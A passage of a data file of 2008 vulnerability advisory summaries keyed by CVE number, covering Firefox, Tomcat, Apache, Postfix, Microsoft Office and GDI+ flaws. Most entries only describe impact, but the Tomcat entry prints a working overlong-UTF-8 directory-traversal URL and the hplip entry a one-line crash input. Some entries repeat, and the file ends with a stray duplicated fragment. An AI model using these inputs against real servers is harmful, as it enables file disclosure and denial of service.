CVE-2008-2934.body: A vulnerability was reported in Mozilla Firefox. A remote user may be able to cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted GIF file that, when loaded by the target user, will free an uninitialized pointer and cause the target user's browser to crash. It may be possible to execute arbitrary code on the target system.Systems running Mac OS X are affected.Firefox 2 is not affected.Drew Yao of Apple Product Security reported this vulnerability.
CVE-2008-2934.extra: A remote user can create a file that, when loaded by the target user, may execute arbitrary code on the target user's system.

CVE-2008-2935.title: libxslt Heap Overflow in exsltCryptoRc4EncryptFunction() May Let Remote Users Execute Arbitrary Code
CVE-2008-2935.body: A vulnerability was reported in libxslt. A user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted XSLT file that, when loaded by the target application, will trigger a heap overflow in the exsltCryptoRc4EncryptFunction() function and execute arbitrary code on the target system. The code will run with the privileges of the target application.The original advisories are available at:http://www.ocert.org/advisories/ocert-2008-009.htmlhttp://www.scary.beasts.org/security/CESA-2008-003.htmlChris Evans of Google Security Team reported this vulnerability.
CVE-2008-2935.extra: A remote user can create a file that, when loaded by the target application, will execute arbitrary code on the target system.

CVE-2008-2936.title: Postfix Symlink Dereference Bug Lets Local Users Gain Elevated Privileges
CVE-2008-2936.body: A vulnerability was reported in Postfix. A local user can obtain elevated privileges on the target system.A local user can hardlink a root-owned symbolic link to the mail spool directory (/var/mail) and cause Postfix to append mail to arbitrary existing files on the target system.Solaris and Linux-based systems may be affected.BSD-based, AIX, Mac OS X, and HP-UX are not affected.The vulnerability resides in 'src/util/safe_open.c'.Sebastian Krahmer reported this vulnerability.
CVE-2008-2936.extra: A local user can obtain elevated privileges on the target system.

CVE-2008-2938.title: Tomcat UTF-8 'AllowLinking' Java Bug Lets Remote Users Traverse the Directory
CVE-2008-2938.body: A vulnerability was reported in Tomcat. A remote user can view files on the target system.A remote user can supply a specially crafted request to view files on target system that are located outside of the document directory.If a context is configured with allowLinking="true" and the connector is configured with URIEncoding="UTF-8", the system may be vulnerable.A demonstration exploit URL is provided:http://[target]/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/foo/bar
CVE-2008-2938.extra: A remote user can view files on the target system.

CVE-2008-2939.title: Apache Input Validation Hole in mod_proxy_ftp Permits Cross-Site Scripting Attacks
CVE-2008-2939.body: A vulnerability was reported in Apache mod_proxy_ftp. A remote user can conduct cross-site scripting attacks.The software does not properly filter HTML code from user-supplied input in FTP URLs before displaying the input. A remote user can create a specially crafted FTP URL containing wildcards that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Apache software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.Marc Bevand of Rapid7 reported this vulnerability.
CVE-2008-2939.extra: A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Apache software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

CVE-2008-2940.title: HP Linux Imaging and Printing Project (hplip) Alert Mailing Function Lets Local Users Gain Elevated Privileges
CVE-2008-2940.body: A vulnerability was reported in HP Linux Imaging and Printing Project (hplip). A local user can obtain elevated privileges on the target system.A local user can send specially crafted packets to cause the alert mailing function to execute arbitrary commands on the target system with root privileges.
CVE-2008-2940.extra: A local user can obtain root privileges on the target system.

CVE-2008-2941.title: HP Linux Imaging and Printing Project (hplip) Bug in hpssd Message Parser Lets Local Users Deny Service
CVE-2008-2941.body: A vulnerability was reported in HP Linux Imaging and Printing Project (hplip). A local user can cause denial of service conditions.A local user can send specially crafted packets to the hpssd message parser to cause the hpssd process to crash.The vulnerability resides in 'hpssd.py'.A demonstration exploit is provided:msg=0
CVE-2008-2941.extra: A local user can cause the hpssd process to crash.

CVE-2008-2945.title: Sun Java System Access Manager XML Signature Processing Bug Lets Remote Users Execute Arbitrary Code
CVE-2008-2945.body: A vulnerability was reported in Sun Java System Access Manager. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create an XML signature with a specially crafted XSLT stylesheet inside an XSLT transform that, when viewed by the target user via the Access Manager, will execute arbitrary code on the target system. The code will run with the privileges of the Access Manager application.Sun Java System Identity Server versions 6.1 and 6.2 are also affected.Brad Hill of iSEC Partners reported this vulnerability.
CVE-2008-2945.extra: A remote user can create an XML signature that, when viewed by the target user, will execute arbitrary code on the target user's system.

CVE-2008-2946.title: Solaris snmpXdmid Bug Lets Remote Users Deny Service
CVE-2008-2946.body: A vulnerability was reported in Solaris. A remote user can cause denial of service conditions.A remote user can send specially crafted data to the target Sun Solstice Enterprise SNMP-DMI mapper subagent daemon (snmpXdmid(1M)) to cause the daemon to crash.IBM Internet Security Systems X-Force reported this vulnerability.
CVE-2008-2946.extra: A remote user can cause denial of service conditions.

CVE-2008-2950.title: Poppler Memory Allocation Bug in 'Page.cc' Lets Remote Users Execute Arbitrary Code
CVE-2008-2950.body: A vulnerability was reported in Poppler. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted PDF file that, when processed by the target application, will trigger a memory allocation error in the Page class constructor/destructor and execute arbitrary code on the target system. The code will run with the privileges of the target application.The vulnerability resides in 'poppler/Page.cc'.The vendor was notified on June 28, 2008.Felipe Andres Manzano reported this vulnerability.The original advisory is available at:http://www.ocert.org/advisories/ocert-2008-007.html
CVE-2008-2950.extra: A remote user can create a PDF file that, when processed by the target application, will execute arbitrary code on the target system.

CVE-2008-2952.title: OpenLDAP ber_get_next() Bug Lets Remote Users Deny Service
CVE-2008-2952.body: A vulnerability was reported in OpenLDAP. A remote user can cause denial of service conditions.A remote user can send specially crafted data to trigger a flaw in the decoding of ASN.1 BER network datagrams and cause the target service to crash.A specially crafted BerElement size value can trigger this flaw.The vulnerability resides in the ber_get_next() function in 'libraries/liblber/io.c'.Cameron Hotchkies reported this vulnerability.
CVE-2008-2952.extra: A remote user can cause the LDAP service to crash.

CVE-2008-2953.title: LinuxDC++ Partial File List Request Processing Bug Lets Remote Users Deny Service
CVE-2008-2953.body: A vulnerability was reported in LinuxDC++. A remote user can cause denial of service conditions.A remote user can send a specially crafted partial file list request to trigger a NULL pointer dereference and cause the target service to crash.crise reported this vulnerability.
CVE-2008-2953.extra: A remote user can cause the target service to crash.

CVE-2008-2953.title: DC++ Partial File List Request Processing Bug Lets Remote Users Deny Service
CVE-2008-2953.body: A vulnerability was reported in DC++. A remote user can cause denial of service conditions.A remote user can send a specially crafted partial file list request to trigger a NULL pointer dereference and cause the target service to crash.crise reported this vulnerability.
CVE-2008-2953.extra: A remote user can cause the target service to crash.

CVE-2008-2954.title: LinuxDC++ Lets Remote Users Deny Service By Sending an Empty Private Message
CVE-2008-2954.body: A vulnerability was reported in LinuxDC++. A remote user can cause denial of service conditions.A remote user can send an empty private message to cause the target service to crash.
CVE-2008-2954.extra: A remote user can cause the target service to crash.

CVE-2008-2954.title: DC++ Lets Remote Users Deny Service By Sending an Empty Private Message
CVE-2008-2954.body: A vulnerability was reported in DC++. A remote user can cause denial of service conditions.A remote user can send an empty private message to cause the target service to crash.
CVE-2008-2954.extra: A remote user can cause the target service to crash.

CVE-2008-2991.title: RoboHelp Input Validation Hole in Help Errors Log Permits Cross-Site Scripting Attacks
CVE-2008-2991.body: A vulnerability was reported in RoboHelp. A remote user can conduct cross-site scripting attacks.Several scripts do not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user that has access to the RoboHelp Help Errors log, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the RoboHelp software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.The non-server version is not affected.The Vulnerability Research Team of Assurent Secure Technologies, a TELUS company, and Greg Patton of PropertyInfo Corporation reported this vulnerability.
CVE-2008-2991.extra: A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the RoboHelp software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

CVE-2008-2992.title: Adobe Acrobat Multiple Flaws Let Remote Users Execute Arbitrary Code
CVE-2008-2992.body: A vulnerabilities were reported in Adobe Acrobat. A remote user can cause arbitrary code to be executed on the target user's system. A local user can obtain elevated privileges.A remote user can create a specially crafted file that, when loaded by the target user, will trigger any of several flaws and execute arbitrary code on the target system. The code will run with the privileges of the target user.Multiple input validation errors allow code execution [CVE-2008-4812, CVE-2008-4813].Input validation flaws in JavaScript methods allow code execution [CVE-2008-2992, CVE-2008-4814].An input validation flaw in the Download Manager may allow code execution during the download process [CVE-2008-4817].A flaw in the Windows-version of the Download Manager may allow the target user's Internet Security options to be modified during the download process [CVE-2008-4816].A local user may be able to obtain elevated privileges on UNIX-based systems [CVE-2008-4815].A user can cause denial of service conditions [CVE-2008-2549].Adobe Reader 9 and Acrobat 9 are not affected by these vulnerabilities.Greg MacManus of iDefense Labs, Peter Vreugdenhil via TippingPoint's Zero Day Initiative and via iDefense, Dyon Balding of Secunia Research, Will Dormann of CERT/CC, Damian Frizza of Core Security Technologies, Greg MacManus of iSIGHT Partners Labs, Javier Vicente Vallejo via TippingPoint's Zero Day Initiative, Thomas Garnier of SkyRecon Systems, and Josh Bressers of Red Hat reported these vulnerabilities.
CVE-2008-2992.extra: A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.A local user can obtain elevated privileges.

CVE-2008-3003.title: Microsoft Excel Credential Caching Bug Lets Local Users Gain Access to Remote Data Sources
CVE-2008-3003.body: A vulnerability was reported in Microsoft Excel. A local user can gain access to secured remote data sources.A local user can open a '.xlsx' file that uses remote data source connections to gain access to the secured remote data source even if the file is configured to not store credentials to the remote data source.Jeremy Funk reported this vulnerability.
CVE-2008-3003.extra: A local user can gain access to a remote data source.

CVE-2008-3004.title: Microsoft Excel Input Validation Bug in Processing Index Values Lets Remote Users Execute Arbitrary Code
CVE-2008-3004.body: A vulnerability was reported in Microsoft Excel. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create an Excel file with specially crafted index values that, when loaded by the target user, will execute arbitrary code on the target system. The code will run with the privileges of the target user.An anonymous researcher reported this vulnerability via iDefense.
CVE-2008-3004.extra: A remote user can create an Excel file that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3005.title: Microsoft Excel Input Validation Bug in Processing Array Index Values Lets Remote Users Execute Arbitrary Code
CVE-2008-3005.body: A vulnerability was reported in Microsoft Excel. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create an Excel file with a specially crafted array index value that, when loaded by the target user, will execute arbitrary code on the target system. The code will run with the privileges of the target user.An anonymous researcher reported this vulnerability via iDefense.
CVE-2008-3005.extra: A remote user can create an Excel file that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3006.title: Microsoft Excel Input Validation Bug in Parsing Records Lets Remote Users Execute Arbitrary Code
CVE-2008-3006.body: A vulnerability was reported in Microsoft Excel. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create an Excel file with specially crafted records that, when loaded by the target user, will execute arbitrary code on the target system. The code will run with the privileges of the target user.An anonymous researcher reported this vulnerability via TippingPoint.
CVE-2008-3006.extra: A remote user can create an Excel file that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3007.title: Microsoft Office OneNote Buffer Overflow Lets Remote Users Execute Arbitrary Code
CVE-2008-3007.body: A vulnerability was reported in Microsoft Office OneNote. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted OneNote protocol handler (onenote://) URL that, when loaded by the target user, will trigger a buffer overflow and execute arbitrary code on the target system. The code will run with the privileges of the target user.Brett Moore of Insomnia Security reported this vulnerability.
CVE-2008-3007.extra: A remote user can create a URL that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3008.title: Windows Media Encoder Buffer Overflow Lets Remote Users Execute Arbitrary Code
CVE-2008-3008.body: A vulnerability was reported in the Windows Media Encoder. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create specially crafted HTML that, when loaded by the target user, will invoke the WMEX.DLL ActiveX control and trigger a buffer overflow to execute arbitrary code on the target system. The code will run with the privileges of the target user.The CLSID of the vulnerable control is: A8D3AD02-7508-4004-B2E9-AD33F087F43CNguyen Minh Duc and Le Manh Tung with Bach Khoa Internetwork Security Center (BKIS) Hanoi University of Technology (Vietnam) reported this vulnerability.
CVE-2008-3008.extra: A remote user can create HTML that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3010.title: Windows Media Player Discloses Authentication Information to Remote Users
CVE-2008-3010.body: A vulnerability was reported in Windows Media Player. A remote user can obtain the target user's authentication credentials.When the target user's Windows Media component accesses a URL that uses an Intra-Site Automatic Tunnel Addressing Protocol (ISATAP) address, the target user's NTLM credentials may be disclosed to the server at that address.
CVE-2008-3010.extra: A remote user can obtain the target user's authentication credentials.

CVE-2008-3010.title: Windows Media Services Discloses Authentication Information to Remote Users
CVE-2008-3010.body: A vulnerability was reported in Windows Media Services. A remote user can obtain the target user's authentication credentials.When the target user's Windows Media component accesses a URL that uses an Intra-Site Automatic Tunnel Addressing Protocol (ISATAP) address, the target user's NTLM credentials may be disclosed to the server at that address.
CVE-2008-3010.extra: A remote user can obtain the target user's authentication credentials.

CVE-2008-3012.title: Microsoft GDI+ Memory Corruption Error in Processing EMF Image Files Lets Remote Users Execute Arbitrary Code
CVE-2008-3012.body: A vulnerability was reported in Microsoft GDI+ in the processing of EMF image files. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted EMF image file that, when loaded by the target user, will trigger a memory corruption error and execute arbitrary code on the target system. The code will run with the privileges of the target user.Bing Liu of Fortinet's FortiGuard Global Security Research Team reported this vulnerability.
CVE-2008-3012.extra: A remote user can create an image file that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3013.title: Microsoft GDI+ Bug in Processing GIF Image Files Lets Remote Users Execute Arbitrary Code
CVE-2008-3013.body: A vulnerability was reported in Microsoft GDI+ in the parsing of GIF images. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted GIF image that, when loaded by the target user, will execute arbitrary code on the target system. The code will run with the privileges of the target user.Peter Winter-Smith of NGSSoftware and Ivan Fratric via Zero Day Initiative reported this vulnerability.
CVE-2008-3013.extra: A remote user can create an image file that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3014.title: Microsoft GDI+ Buffer Overflow in Processing WMF Files Lets Remote Users Execute Arbitrary Code
CVE-2008-3014.body: A vulnerability was reported in Microsoft GDI+ in processing WMF files. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted Windows MetaFile (WMF) image file that, when loaded by the target user, will trigger a buffer overflow and execute arbitrary code on the target system. The code will run with the privileges of the target user.The Assurent Secure Technologies Vulnerability Research Team reported this vulnerability.
CVE-2008-3014.extra: A remote user can create an image file that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3015.title: Microsoft GDI+ Integer Overflow in Processing BMP Files Lets Remote Users Execute Arbitrary Code
CVE-2008-3015.body: A vulnerability was reported in Microsoft GDI+ in processing BMP files. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted BMP image file that, when loaded by the target user, will trigger an integer overflow and execute arbitrary code on the target system. The code will run with the privileges of the target user.An anonymous researcher via Zero Day Initiative reported this vulnerability.
CVE-2008-3015.extra: A remote user can create an image file that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3018.title: Microsoft Office Format Filter Bugs Let Remote Users Execute Arbitrary Code
CVE-2008-3018.body: Several vulnerabilities were reported in Microsoft Office. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted file that, when loaded by the target user with Microsoft Office, will execute arbitrary code on the target user's system. The code will run with the privileges of the target user.The vulnerabilities reside in various Microsoft Office filters.A specially crafted PICT image file can trigger code execution [CVE-2008-3018]. Shaun Colley of NGS Software reported this vulnerability.A specially crafted Encapsulated PostScript (EPS) file can trigger code execution [CVE-2008-3019].A specially crafted BMP image file can trigger code execution [CVE-2008-3020]. An anonymous researcher reported this vulnerability via iDefense.A specially crafted PICT image file can trigger code execution [CVE-2008-3021]. Damian Put reported this vulnerability via TippingPoint.A specially crafted WPG image file can trigger code execution [CVE-2008-3460]. Damian Put reported this vulnerability via iDefense.Microsoft Office Project 2002 SP1, Microsoft Office Converter Pack, and Microsoft Works 8 are also affected by these vulnerabilities.
CVE-2008-3018.extra: A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-3019.title: Microsoft Office Format Filter Bugs Let Remote Users Execute Arbitrary Code
CVE-2008-3019.body: Several vulnerabilities were reported in Microsoft Office. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted file that, when loaded by the target user with Microsoft Office, will execute arbitrary code on the target user's system. The code will run with the privileges of the target user.The vulnerabilities reside in various Microsoft Office filters.A specially crafted PICT image file can trigger code execution [CVE-2008-3018]. Shaun Colley of NGS Software reported this vulnerability.A specially crafted Encapsulated PostScript (EPS) file can trigger code execution [CVE-2008-3019].A specially crafted BMP image file can trigger code execution [CVE-2008-3020]. An anonymous researcher reported this vulnerability via iDefense.A specially crafted PICT image file can trigger code execution [CVE-2008-3021]. Damian Put reported this vulnerability via TippingPoint.A specially crafted WPG image file can trigger code execution [CVE-2008-3460]. Damian Put reported this vulnerability via iDefense.Microsoft Office Project 2002 SP1, Microsoft Office Converter Pack, and Microsoft Works 8 are also affected by these vulnerabilities.
CVE-2008-3019.extra: A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.

An anonymous researcher reported this vulnerability via iDefense.A specially crafted PICT image file can trigger code execution [CVE-2008-3021]. Damian Put reported this vulnerability via TippingPoint.A specially crafted WPG image file can trigger code execution [CVE-2008-3460]. Damian Put reported this vulnerability via iDefense.Microsoft Office Project 2002 SP1, Microsoft Office Converter Pack, and Microsoft Works 8 are also affected by these vulnerabilities.
